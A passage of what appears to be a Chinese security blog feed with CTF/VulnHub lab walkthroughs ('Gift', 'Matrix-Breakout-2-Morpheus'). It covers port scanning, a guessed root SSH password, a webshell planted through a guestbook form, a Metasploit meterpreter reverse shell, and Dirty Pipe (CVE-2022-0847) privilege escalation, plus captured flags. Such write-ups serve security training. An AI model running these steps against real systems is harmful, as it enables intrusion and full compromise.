class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.36<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:08:75:F7 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.89 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22,80</code></p><h2 id="2、端口详细信息扫描"><a href="#2、端口详细信息扫描" class="headerlink" title="2、端口详细信息扫描"></a>2、端口详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sT -sV -sC -O --min-rate 10000 -p22,80 192.168.2.36 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 10:33 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.36<br>Host is up (0.00072s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 2c:1b:36:27:e5:4c:52:7b:3e:10:94:41:39:ef:b2:95 (RSA)<br>|   256 93:c1:1e:32:24:0e:34:d9:02:0e:ff:c3:9c:59:9b:<span class="hljs-built_in">dd</span> (ECDSA)<br>|_  256 81:ab:36:ec:b1:2b:5c:d2:86:55:12:0c:51:00:27:d7 (ED25519)<br>80/tcp open  http    nginx<br>|_http-title: Site doesnt have a title (text/html).<br>MAC Address: 08:00:27:08:75:F7 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.63 seconds<br></code></pre></td></tr></table></figure><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506231048518.png"><br>提示：<code>不深思。真的，很简单。</code></p><h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.36 -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.36<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 57]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>未发现其他目录</p><h1 id="尝试SSH登录"><a href="#尝试SSH登录" class="headerlink" title="尝试SSH登录"></a>尝试SSH登录</h1><p>尝试使用<code>simple</code>作为登录凭据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# ssh root@192.168.2.36   <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.36 (192.168.2.36)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:dXsAE5SaInFUaPinoxhcuNloPhb2/x2JhoGVdcF8Y6I.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.36<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">root@192.168.2.36&#x27;</span>s password: <br>IM AN SSH SERVER<br>gift:~# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialou<br></code></pre></td></tr></table></figure><p>成功进行<code>root</code>权限</p><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gift:~# <span class="hljs-built_in">cat</span> user.txt <br>HMV665sXzDS<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gift:~# <span class="hljs-built_in">cat</span> root.txt <br>HMVtyr543FG<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hackmyvm</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Matrix-Breakout-2-Morpheus</title>
    <link href="/Vulnhub/Matrix-Breakout-2-Morpheus/"/>
    <url>/Vulnhub/Matrix-Breakout-2-Morpheus/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/">https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:33 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00012s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.00023s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00042s latency).<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.0018s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 28.00 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.6 -oA nmapscan/ports           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:34 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.0029s latency).<br>Not shown: 65532 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>81/tcp open  hosts2-ns<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.39 seconds<br></code></pre></td></tr></table></figure><ul><li>开放端口22,80和81<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80,81 192.168.1.6 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:35 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.51 ((Debian))<br>81/tcp open  http    nginx 1.18.0<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 - 5.5 (99%), Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (96%), Sony X75CH-series Android TV (Android 5.0) (95%), Linux 3.1 (95%), Linux 3.2 (95%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 23.03 seconds<br></code></pre></td></tr></table></figure></li><li>22端口是ssh服务，80端口是Apache服务，81端口是Nginx<br>（3）进行UDP扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80,81 192.168.1.6 -oA nmapscan/udp                          <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:36 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00094s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>81/udp closed hosts2-ns<br>MAC Address: 00:0C:29:47:20:8B (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.33 seconds<br></code></pre></td></tr></table></figure></li><li>端口没有开放UDP<br>（4）进行漏洞扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80,81 192.168.1.6 -oA nmapscan/vuln<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-10 15:37 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.6<br>Host is up (0.00068s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /robots.txt: Robots file</span><br><span class="hljs-string">81/tcp open  hosts2-ns</span><br><span class="hljs-string">MAC Address: 00:0C:29:47:20:8B (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 44.30 seconds</span><br></code></pre></td></tr></table></figure></li><li>在80端口下，发现一个robot.txt文件</li></ul><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）访问80端口，是一个静态页面，提示了ssh的权限<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101541750.png"><br>（2）进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/matrix-breakout-2-morpheus]<br>└─$ <span class="hljs-built_in">sudo</span> gobuster <span class="hljs-built_in">dir</span> -u http://192.168.1.6 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.1.6<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.php                 (Status: 403) [Size: 276]<br>/index.html           (Status: 200) [Size: 348]<br>/.html                (Status: 403) [Size: 276]<br>/javascript           (Status: 301) [Size: 315] [--&gt; http://192.168.1.6/javascript/]<br>/robots.txt           (Status: 200) [Size: 47]<br>/graffiti.txt         (Status: 200) [Size: 139]<br>/graffiti.php         (Status: 200) [Size: 451]<br>/.php                 (Status: 403) [Size: 276]<br>/.html                (Status: 403) [Size: 276]<br>/server-status        (Status: 403) [Size: 276]<br>Progress: 882236 / 882240 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>（3）访问robot.txt，提示没有任何东西<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101554751.png"><br>（4）访问graffiti.txt，有相关的提示信息<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101556479.png"><br>（5）访问graffiti.php，找到一个留言框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101557085.png"></p><h2 id="web渗透-1"><a href="#web渗透-1" class="headerlink" title="web渗透"></a>web渗透</h2><p>（1）随便发送数据，进行尝试，发现提交后，会显示在当前页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101602020.png"><br>（2）查看数据包，发现提交的内容写入到了graffiti.txt文件中<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101612604.png"><br>（3）尝试写入一个webshell，另保存为一个php文件<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101616669.png"><br>（4）使用哥斯拉进行连接，成功进入<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101623390.png"><br>（5）使用模块<code>PMeterpreter</code>进行稳定反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 &gt;  use exploit/multi/handler <br>[*] Using configured payload generic/shell_reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br>payload =&gt; php/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> lport 4444<br>lport =&gt; 4444<br>msf6 exploit(multi/handler) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[*] Sending stage (39927 bytes) to 192.168.1.6<br>[*] Meterpreter session 1 opened (192.168.1.5:4444 -&gt; 192.168.1.6:47686) at 2025-02-10 16:26:51 +0800<br><br>meterpreter &gt; <br></code></pre></td></tr></table></figure><h1 id="提权-dirtypipe"><a href="#提权-dirtypipe" class="headerlink" title="提权-dirtypipe"></a>提权-dirtypipe</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，将脚本上传至临时目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; upload linux-exploit-suggester.sh /tmp/1.sh<br>[*] Uploading  : /miao/vulnhub/matrix-breakout-2-morpheus/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Uploaded -1.00 B of 88.80 KiB (-0.0%): /miao/vulnhub/matrix-breakout-2-morpheus/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>[*] Completed  : /miao/vulnhub/matrix-breakout-2-morpheus/linux-exploit-suggester.sh -&gt; /tmp/1.sh<br>meterpreter &gt; shell<br>Process 1105 created.<br>Channel 1 created.<br><span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">chmod</span> +x 1.sh<br>./1.sh<br></code></pre></td></tr></table></figure><p>（2）寻找到可能存在的漏洞利用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502101630578.png"><br>（3）寻找可利用的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; background <br>[*] Backgrounding session 1...<br>msf6 exploit(multi/handler) &gt; search dirtypipe<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                         Disclosure Date  Rank       Check  Description</span><br>   -  ----                                         ---------------  ----       -----  -----------<br>   0  exploit/linux/local/cve_2022_0847_dirtypipe  2022-02-20       excellent  Yes    Dirty Pipe Local Privilege Escalation via CVE-2022-0847<br><br><br>Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/local/cve_2022_0847_dirtypipe                               <br></code></pre></td></tr></table></figure><p>（4）使用该脚本进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/handler) &gt; use exploit/linux/local/cve_2022_0847_dirtypipe <br>[*] Using configured payload linux/x64/meterpreter/reverse_tcp<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; sessions<br><br>Active sessions<br>===============<br><br>  Id  Name  Type                   Information          Connection<br>  --  ----  ----                   -----------          ----------<br>  1         meterpreter php/linux  www-data @ morpheus  192.168.1.5:4444 -&gt; 192.168.1.6:47686 (192.<br>                                                        168.1.6)<br><br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; <span class="hljs-built_in">set</span> session 1<br>session =&gt; 1<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; run<br><br>[-] Msf::OptionValidateError One or more options failed to validate: LHOST.<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; <span class="hljs-built_in">set</span> lhost 0.0.0.0<br>lhost =&gt; 0.0.0.0<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; run<br><br>[*] Started reverse TCP handler on 0.0.0.0:4444 <br>[!] SESSION may not be compatible with this module:<br>[!]  * incompatible session architecture: php<br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0<br>[*] Executing exploit <span class="hljs-string">&#x27;/tmp/.daigaaizfky /bin/passwd&#x27;</span><br>[*] Exploit completed, but no session was created.<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; <span class="hljs-built_in">set</span> lhost 192.168.1.5<br>lhost =&gt; 192.168.1.5<br>msf6 exploit(linux/local/cve_2022_0847_dirtypipe) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.1.5:4444 <br>[!] SESSION may not be compatible with this module:<br>[!]  * incompatible session architecture: php<br>[*] Running automatic check (<span class="hljs-string">&quot;set AutoCheck false&quot;</span> to <span class="hljs-built_in">disable</span>)<br>[+] The target appears to be vulnerable. Linux kernel version found: 5.10.0<br>[*] Executing exploit <span class="hljs-string">&#x27;/tmp/.spwuydueg /bin/passwd&#x27;</span><br>[*] Sending stage (3045380 bytes) to 192.168.1.6<br>[+] Deleted /tmp/.spwuydueg<br>[*] Meterpreter session 2 opened (192.168.1.5:4444 -&gt; 192.168.1.6:47730) at 2025-02-10 16:35:44 +0800<br>meterpreter &gt; <br></code></pre></td></tr></table></figure><p>（5）成功提权到root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; getuid<br>Server username: root<br></code></pre></td></tr></table></figure><p><strong>查看flag</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; shell<br>Process 2917 created.<br>Channel 1 created.<br><span class="hljs-built_in">cat</span> /root/FLAG.txt<br>You<span class="hljs-string">&#x27;ve won!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Let&#x27;</span>s hope Matrix: Resurrections rocks!<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）主要就是一个web逻辑的渗透<br>（2）提权msf一键梭哈</p>]]></content>
    
    
    <categories>
      
      <category>Vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逻辑漏洞</tag>
      
      <tag>提权-dirtypipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackable3</title>
    <link href="/Vulnhub/Hackable3/"/>
    <url>/Vulnhub/Hackable3/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/hackable-iii,720/">https://www.vulnhub.com/entry/hackable-iii,720/</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 14:19 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00016s latency).<br>MAC Address: 0A:00:27:00:00:0A 